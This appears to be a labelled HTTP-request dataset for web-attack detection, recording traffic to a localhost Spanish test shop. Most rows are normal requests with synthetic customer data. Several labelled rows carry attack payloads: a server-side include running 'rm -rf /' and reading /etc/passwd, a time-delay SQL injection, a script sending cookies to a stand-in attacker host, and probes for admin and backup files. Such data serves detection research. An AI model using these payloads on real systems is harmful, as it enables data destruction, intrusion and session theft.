Method,Accept,host,connection,classification,URL,content_tokens,url_path,url_query,clean_url
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,[],/tienda1/publico/anadir.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/anadir.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jyuo&password=cuarter8da&nombre=Lindolfo&apellidos=Torterolo+Buix%F3&email=lippe-bubat4%40tradora.va&dni=08105727K&direccion=Camino+Del+Caliero%2C+75+&ciudad=Villargordo+del+Cabriel&cp=43470&provincia=Guadalajara&ntc=9428064689399075&B1=Registrar HTTP/1.1,"['modo', 'login', 'password', 'nombre', 'apellidos', 'email', 'dni', 'direccion', 'ciudad', 'cp', 'provincia', 'ntc', 'B1']",/tienda1/miembros/editar.jsp,modo=registro&login=jyuo&password=cuarter8da&nombre=Lindolfo&apellidos=Torterolo+Buix%F3&email=lippe-bubat4%40tradora.va&dni=08105727K&direccion=Camino+Del+Caliero%2C+75+&ciudad=Villargordo+del+Cabriel&cp=43470&provincia=Guadalajara&ntc=9428064689399075&B1=Registrar HTTP/1.1,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jyuo&password=cuarter8da&nombre=Lindolfo&apellidos=Torterolo+Buix%F3&email=lippe-bubat4%40tradora.va&dni=08105727K&direccion=Camino+Del+Caliero%2C+75+&ciudad=Villargordo+del+Cabriel&cp=43470&provincia=Guadalajara&ntc=9428064689399075&B1=Registrar
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,[],/tienda1/miembros/salir.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/salir.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/index.jsp/4861362529278789730 HTTP/1.1,[],/tienda1/index.jsp/4861362529278789730 HTTP/1.1,,http://localhost:8080/tienda1/index.jsp/4861362529278789730
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,[],/tienda1/publico/autenticar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/autenticar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,['errorMsg'],/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas HTTP/1.1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,[],/tienda1/miembros/editar.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/editar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=phaidra&password=48p81o0oo&nombre=Olaya&apellidos=Claudio+Iturrieta&email=on%40guejos.at&dni=70202479Q&direccion=C%2F+Concepcion+Alexandre+82%2C+&ciudad=Begur&cp=48310&provincia=Albacete&ntc=5802409488938737&B1=Registrar HTTP/1.1,"['modo', 'login', 'password', 'nombre', 'apellidos', 'email', 'dni', 'direccion', 'ciudad', 'cp', 'provincia', 'ntc', 'B1']",/tienda1/miembros/editar.jsp,modo=registro&login=phaidra&password=48p81o0oo&nombre=Olaya&apellidos=Claudio+Iturrieta&email=on%40guejos.at&dni=70202479Q&direccion=C%2F+Concepcion+Alexandre+82%2C+&ciudad=Begur&cp=48310&provincia=Albacete&ntc=5802409488938737&B1=Registrar HTTP/1.1,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=phaidra&password=48p81o0oo&nombre=Olaya&apellidos=Claudio+Iturrieta&email=on%40guejos.at&dni=70202479Q&direccion=C%2F+Concepcion+Alexandre+82%2C+&ciudad=Begur&cp=48310&provincia=Albacete&ntc=5802409488938737&B1=Registrar
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,[],/tienda1/miembros/fotos.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/fotos.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,[],/tienda1/miembros/salir.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/salir.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,[],/tienda1/publico/vaciar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/vaciar.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,[],/tienda1/publico/caracteristicas.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/caracteristicas.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,[],/tienda1/miembros/editar.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/editar.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,[],/tienda1/publico/vaciar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/vaciar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,['B2'],/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito HTTP/1.1,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,[],/tienda1/publico/entrar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/entrar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,[],/tienda1/global/creditos.jsp HTTP/1.1,,http://localhost:8080/tienda1/global/creditos.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,[],/tienda1/publico/carrito.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/carrito.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,[],/tienda1/publico/anadir.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/anadir.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,[],/tienda1/miembros/fotos.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/fotos.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1,['idA'],/tienda1/publico/caracteristicas.jsp,idA=1 HTTP/1.1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,[],/tienda1/publico/autenticar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/autenticar.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,[],/tienda1/publico/entrar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/entrar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=950&B1=Confirmar HTTP/1.1,"['modo', 'precioA', 'B1']",/tienda1/publico/pagar.jsp,modo=insertar&precioA=950&B1=Confirmar HTTP/1.1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=950&B1=Confirmar
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=koprulu&password=8e6a74aer&nombre=Lihu%E9l&apellidos=Canal+Dolcet&email=samuel.felden%40multaspendientes.yu&dni=53666035C&direccion=Pasaje+Trigueros%2C+170%2C+&ciudad=Bufali&cp=45182&provincia=C%E1ceres&ntc=5730165780562734&B1=Registrar HTTP/1.1,"['modo', 'login', 'password', 'nombre', 'apellidos', 'email', 'dni', 'direccion', 'ciudad', 'cp', 'provincia', 'ntc', 'B1']",/tienda1/publico/registro.jsp,modo=registro&login=koprulu&password=8e6a74aer&nombre=Lihu%E9l&apellidos=Canal+Dolcet&email=samuel.felden%40multaspendientes.yu&dni=53666035C&direccion=Pasaje+Trigueros%2C+170%2C+&ciudad=Bufali&cp=45182&provincia=C%E1ceres&ntc=5730165780562734&B1=Registrar HTTP/1.1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=koprulu&password=8e6a74aer&nombre=Lihu%E9l&apellidos=Canal+Dolcet&email=samuel.felden%40multaspendientes.yu&dni=53666035C&direccion=Pasaje+Trigueros%2C+170%2C+&ciudad=Bufali&cp=45182&provincia=C%E1ceres&ntc=5730165780562734&B1=Registrar
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,[],/tienda1/publico/autenticar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/autenticar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dody&password=RIzof%D3rEo&nombre=Landelina&apellidos=Bignes+Arriaza&email=cassagna%40eurograb.tw&dni=97817638H&direccionA=Gondola+89+&ciudad=Campillos-Sierra&cp=44145&provincia=Lugo&ntc=1198533342544918&B1=Registrar HTTP/1.1,"['modo', 'login', 'password', 'nombre', 'apellidos', 'email', 'dni', 'direccionA', 'ciudad', 'cp', 'provincia', 'ntc', 'B1']",/tienda1/publico/registro.jsp,modo=registro&login=dody&password=RIzof%D3rEo&nombre=Landelina&apellidos=Bignes+Arriaza&email=cassagna%40eurograb.tw&dni=97817638H&direccionA=Gondola+89+&ciudad=Campillos-Sierra&cp=44145&provincia=Lugo&ntc=1198533342544918&B1=Registrar HTTP/1.1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dody&password=RIzof%D3rEo&nombre=Landelina&apellidos=Bignes+Arriaza&email=cassagna%40eurograb.tw&dni=97817638H&direccionA=Gondola+89+&ciudad=Campillos-Sierra&cp=44145&provincia=Lugo&ntc=1198533342544918&B1=Registrar
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gussy&password=ha6enDuEl6&nombreA=Ferreol&apellidos=Corvera&email=mecker%40clubforex.gf&dni=23871700T&direccion=Coraceros+37+&ciudad=Gij%F3n&cp=28792&provincia=Teruel&ntc=8776652546820108&B1=Registrar HTTP/1.1,"['modo', 'login', 'password', 'nombreA', 'apellidos', 'email', 'dni', 'direccion', 'ciudad', 'cp', 'provincia', 'ntc', 'B1']",/tienda1/publico/registro.jsp,modo=registro&login=gussy&password=ha6enDuEl6&nombreA=Ferreol&apellidos=Corvera&email=mecker%40clubforex.gf&dni=23871700T&direccion=Coraceros+37+&ciudad=Gij%F3n&cp=28792&provincia=Teruel&ntc=8776652546820108&B1=Registrar HTTP/1.1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gussy&password=ha6enDuEl6&nombreA=Ferreol&apellidos=Corvera&email=mecker%40clubforex.gf&dni=23871700T&direccion=Coraceros+37+&ciudad=Gij%F3n&cp=28792&provincia=Teruel&ntc=8776652546820108&B1=Registrar
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,[],/tienda1/imagenes/logo.gif HTTP/1.1,,http://localhost:8080/tienda1/imagenes/logo.gif
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/imagenes/3.gif~ HTTP/1.1,[],/tienda1/imagenes/3.gif~ HTTP/1.1,,http://localhost:8080/tienda1/imagenes/3.gif~
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=isaac&password=desFia709&nombre=Ivanka&apellidos=Ayestar%E1n+Pastor&emailA=olivier%40rockefeller.sh&dni=44979325L&direccion=Calle+Andalucia%2C+91+&ciudad=Casafranca&cp=05279&provincia=Soria&ntc=0629880233317520&B1=Registrar HTTP/1.1,"['modo', 'login', 'password', 'nombre', 'apellidos', 'emailA', 'dni', 'direccion', 'ciudad', 'cp', 'provincia', 'ntc', 'B1']",/tienda1/publico/registro.jsp,modo=registro&login=isaac&password=desFia709&nombre=Ivanka&apellidos=Ayestar%E1n+Pastor&emailA=olivier%40rockefeller.sh&dni=44979325L&direccion=Calle+Andalucia%2C+91+&ciudad=Casafranca&cp=05279&provincia=Soria&ntc=0629880233317520&B1=Registrar HTTP/1.1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=isaac&password=desFia709&nombre=Ivanka&apellidos=Ayestar%E1n+Pastor&emailA=olivier%40rockefeller.sh&dni=44979325L&direccion=Calle+Andalucia%2C+91+&ciudad=Casafranca&cp=05279&provincia=Soria&ntc=0629880233317520&B1=Registrar
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,[],/tienda1/publico/carrito.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/carrito.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=krishna&pwd=3o%3F964I7A1&remember=on&B1=Entrar%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1,"['modo', 'login', 'pwd', 'remember', 'B1']",/tienda1/publico/autenticar.jsp,modo=entrar&login=krishna&pwd=3o%3F964I7A1&remember=on&B1=Entrar%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=krishna&pwd=3o%3F964I7A1&remember=on&B1=Entrar%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,['errorMsgA'],/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas HTTP/1.1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,[],/tienda1/miembros/index.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/index.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,[],/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/CFIDE/administrator/aboutcf.cfm HTTP/1.1,[],/CFIDE/administrator/aboutcf.cfm HTTP/1.1,,http://localhost:8080/CFIDE/administrator/aboutcf.cfm
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/webapp/examples/login.html HTTP/1.1,[],/webapp/examples/login.html HTTP/1.1,,http://localhost:8080/webapp/examples/login.html
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,['B2'],/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito HTTP/1.1,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/global/estilos.css/4861362529278789730 HTTP/1.1,[],/tienda1/global/estilos.css/4861362529278789730 HTTP/1.1,,http://localhost:8080/tienda1/global/estilos.css/4861362529278789730
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,[],/tienda1/publico/entrar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/entrar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,[],/tienda1/publico/productos.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/productos.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/.Inc HTTP/1.1,[],/tienda1/.Inc HTTP/1.1,,http://localhost:8080/tienda1/.Inc
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/6909030637832563290.jsp.BAK HTTP/1.1,[],/tienda1/publico/6909030637832563290.jsp.BAK HTTP/1.1,,http://localhost:8080/tienda1/publico/6909030637832563290.jsp.BAK
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precioA=39&cantidad=58&B1=A%F1adir+al+carrito HTTP/1.1,"['id', 'nombre', 'precioA', 'cantidad', 'B1']",/tienda1/publico/anadir.jsp,id=2&nombre=Jam%F3n+Ib%E9rico&precioA=39&cantidad=58&B1=A%F1adir+al+carrito HTTP/1.1,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precioA=39&cantidad=58&B1=A%F1adir+al+carrito
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=43&B1=A%F1adir+al+carrito HTTP/1.1,"['id', 'nombre', 'precio', 'cantidad', 'B1']",/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precio=85&cantidad=43&B1=A%F1adir+al+carrito HTTP/1.1,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=43&B1=A%F1adir+al+carrito
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,['errorMsg'],/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,[],/tienda1/publico/caracteristicas.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/caracteristicas.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=73&B1=A%F1adir+al+carrito HTTP/1.1,"['id', 'nombre', 'precio', 'cantidad', 'B1']",/tienda1/publico/anadir.jsp,id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=73&B1=A%F1adir+al+carrito HTTP/1.1,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=73&B1=A%F1adir+al+carrito
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,[],/tienda1/publico/vaciar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/vaciar.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,[],/tienda1/publico/pagar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/pagar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=emelia7&password=e6u*ipolado&nombre=Gelsomino&apellidos=Medio+Bullones&email=radzum_noriega%40alcantarapartners.hr&dni=15508885P&direccion=C%2F+Cadernera%2C+180%2C+5%3FC&ciudad=B%F3veda&cp=06360&provincia=La+Rioja&ntc=3331042207803695sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Registrar HTTP/1.1,"['modo', 'login', 'password', 'nombre', 'apellidos', 'email', 'dni', 'direccion', 'ciudad', 'cp', 'provincia', 'ntc', 'B1']",/tienda1/miembros/editar.jsp,modo=registro&login=emelia7&password=e6u*ipolado&nombre=Gelsomino&apellidos=Medio+Bullones&email=radzum_noriega%40alcantarapartners.hr&dni=15508885P&direccion=C%2F+Cadernera%2C+180%2C+5%3FC&ciudad=B%F3veda&cp=06360&provincia=La+Rioja&ntc=3331042207803695sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Registrar HTTP/1.1,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=emelia7&password=e6u*ipolado&nombre=Gelsomino&apellidos=Medio+Bullones&email=radzum_noriega%40alcantarapartners.hr&dni=15508885P&direccion=C%2F+Cadernera%2C+180%2C+5%3FC&ciudad=B%F3veda&cp=06360&provincia=La+Rioja&ntc=3331042207803695sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Registrar
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,[],/tienda1/imagenes/2.gif HTTP/1.1,,http://localhost:8080/tienda1/imagenes/2.gif
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,[],/tienda1/publico/pagar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/pagar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,[],/tienda1/imagenes/cmenbul.gif HTTP/1.1,,http://localhost:8080/tienda1/imagenes/cmenbul.gif
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/index.jsp HTTP/1.1,[],/tienda1/index.jsp HTTP/1.1,,http://localhost:8080/tienda1/index.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,[],/tienda1/publico/productos.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/productos.jsp
